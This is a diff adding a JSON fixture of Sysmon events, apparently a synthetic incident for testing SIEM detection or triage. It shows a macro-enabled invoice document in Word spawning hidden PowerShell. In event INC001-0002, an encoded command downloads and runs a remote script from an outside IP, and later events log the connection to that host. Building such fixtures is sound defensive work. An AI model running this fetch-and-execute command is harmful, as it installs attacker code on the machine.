@@ -1,0 +1,148 @@
+[
+  {
+    "id": "INC001-0001",
+    "timestamp": "2026-09-29T14:02:10.000Z",
+    "agent": {
+      "id": "001",
+      "name": "FIN-WKS-014",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "FIN-WKS-014"
+        },
+        "eventdata": {
+          "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "commandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jhopkins\\Downloads\\Invoice_4471.docm\"",
+          "processGuid": "{aaaa1111-0000-0000-0001-000000000001}",
+          "processId": "5120",
+          "parentImage": "C:\\Windows\\explorer.exe",
+          "user": "CORP\\jhopkins"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC001-0002",
+    "timestamp": "2026-09-29T14:02:12.500Z",
+    "agent": {
+      "id": "001",
+      "name": "FIN-WKS-014",
+      "ip": "10.20.5.11"
+    },
+    "rule": {
+      "id": "92052",
+      "level": 12,
+      "description": "Powershell with encoded and hidden window arguments"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "FIN-WKS-014"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA0AC8AYQAuAHAAcwAxACcAKQA=",
+          "processGuid": "{aaaa1111-0000-0000-0001-000000000002}",
+          "processId": "6044",
+          "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "parentProcessGuid": "{aaaa1111-0000-0000-0001-000000000001}",
+          "parentCommandLine": "\"WINWORD.EXE\" /n \"...Invoice_4471.docm\"",
+          "user": "CORP\\jhopkins"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC001-0003",
+    "timestamp": "2026-09-29T14:02:14.100Z",
+    "agent": {
+      "id": "001",
+      "name": "FIN-WKS-014",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "FIN-WKS-014"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "processGuid": "{aaaa1111-0000-0000-0001-000000000002}",
+          "processId": "6044",
+          "destinationIp": "185.220.101.44",
+          "destinationPort": "443",
+          "destinationHostname": "cdn-node-44.example-bad.net",
+          "protocol": "tcp",
+          "user": "CORP\\jhopkins"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC001-0004",
+    "timestamp": "2026-09-29T14:02:13.700Z",
+    "agent": {
+      "id": "001",
+      "name": "FIN-WKS-014",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "22",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "FIN-WKS-014"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "processGuid": "{aaaa1111-0000-0000-0001-000000000002}",
+          "queryName": "cdn-node-44.example-bad.net",
+          "queryResults": "185.220.101.44"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC001-0005",
+    "timestamp": "2026-09-29T13:58:00.000Z",
+    "agent": {
+      "id": "001",
+      "name": "FIN-WKS-014",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "FIN-WKS-014"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\notepad.exe",
+          "commandLine": "notepad.exe",
+          "processGuid": "{aaaa1111-0000-0000-0001-00000000000f}",
+          "processId": "3300",
+          "parentImage": "C:\\Windows\\explorer.exe",
+          "user": "CORP\\jhopkins"
+        }
+      }
+    }
+  }
+]
